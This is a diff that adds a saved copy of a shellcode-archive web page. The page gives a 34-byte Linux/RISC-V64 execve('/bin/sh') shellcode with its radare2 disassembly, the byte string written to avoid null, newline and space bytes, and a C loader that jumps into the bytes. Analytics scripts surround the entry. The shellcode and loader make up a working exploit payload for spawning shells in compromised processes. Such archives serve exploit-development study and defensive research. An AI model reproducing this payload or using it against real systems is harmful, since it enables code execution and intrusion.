@@ -1,0 +1,102 @@
+
+<!-- saved from url=(0056)http://shell-storm.org/shellcode/files/shellcode-908.php -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Linux/RISC-V64 - execve(/bin/sh, NULL, 0) - 34 bytes</title>
+
+<meta http-equiv="Content-Language" content="en">
+</head>
+
+
+<body data-new-gr-c-s-check-loaded="14.1026.0" data-gr-ext-installed=""><pre>/*
+Title:  Linux/RISC-V - execve("/bin/sh", NULL, 0) - 34 bytes
+Date:   2019-06-06
+Tested: riscv64 (qemu isa rv64imafdcu)
+Author: Christina Quast - twitter: @binarychrysh
+
+Inspired by: https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html
+
+Shellcode RISC-V without 0x20, 0x0a and 0x00
+
+compiler (assuming riscv platform): gcc -z execstack -o loader loader.c
+
+r2 output:
+[0x000100b0]&gt; pdf
+            ;-- section..text:
+            ;-- _start:
+            ;-- rip:
+/ (fcn) entry0 76
+|   entry0 ();
+|           0x000100b0      0111           addi sp, sp, -32            ; [01] -r-x section size 76 named .text
+|           0x000100b2      06ec           sd ra, 24(sp)
+|           0x000100b4      22e8           sd s0, 16(sp)
+|           0x000100b6      13042102       addi s0, sp, 34
+|           0x000100ba      b767696e       lui a5, 0x6e696
+|           0x000100be      9387f722       addi a5, a5, 559
+|           0x000100c2      2330f4fe       sd a5, -32(s0)
+|           0x000100c6      b7776810       lui a5, 0x10687
+|           0x000100ca      33480801       xor a6, a6, a6
+|           0x000100ce      0508           addi a6, a6, 1
+|           0x000100d0      7208           slli a6, a6, 0x1c
+|           0x000100d2      b3870741       sub a5, a5, a6
+|           0x000100d6      9387f732       addi a5, a5, 815
+|           0x000100da      2332f4fe       sd a5, -28(s0)
+|           0x000100de      930704fe       addi a5, s0, -32
+|           0x000100e2      0146           li a2, 0
+|           0x000100e4      8145           li a1, 0
+|           0x000100e6      3e85           mv a0, a5
+|           0x000100e8      9308d00d       li a7, 221
+|           0x000100ec      93063007       li a3, 115
+|           0x000100f0      230ed1ee       sb a3, -260(sp)
+|           0x000100f4      9306e1ef       addi a3, sp, -258
+\           0x000100f8      6780e6ff       jr -2(a3)
+
+
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+char *SC = "\x01\x11\x06\xec"
+           "\x22\xe8\x13\x04"
+           "\x21\x02\xb7\x67"
+           "\x69\x6e\x93\x87"
+           "\xf7\x22\x23\x30"
+           "\xf4\xfe\xb7\x77"
+           "\x68\x10\x33\x48"
+           "\x08\x01\x05\x08"
+           "\x72\x08\xb3\x87"
+           "\x07\x41\x93\x87"
+           "\xf7\x32\x23\x32"
+           "\xf4\xfe\x93\x07"
+           "\x04\xfe\x01\x46"
+           "\x81\x45\x3e\x85"
+           "\x93\x08\xd0\x0d"
+           "\x93\x06\x30\x07"
+           "\x23\x0e\xd1\xee"
+           "\x93\x06\xe1\xef"
+           "\x67\x80\xe6\xff";
+
+
+int main(void)
+{
+    char payload[76];
+
+    memcpy(payload, SC, 76);
+
+    fprintf(stdout, "Length: %d\n", strlen(SC));
+    (*(void(*)()) payload) ();
+
+return 0;
+}
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
+</script><script src="./Linux_RISC-V64 - execve(_bin_sh, NULL, 0) - 34 bytes_files/ga.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-6809519-1");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+
+</pre></body><div style="all: initial;"><div id="__hcfy__" style="all: initial;"></div></div><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
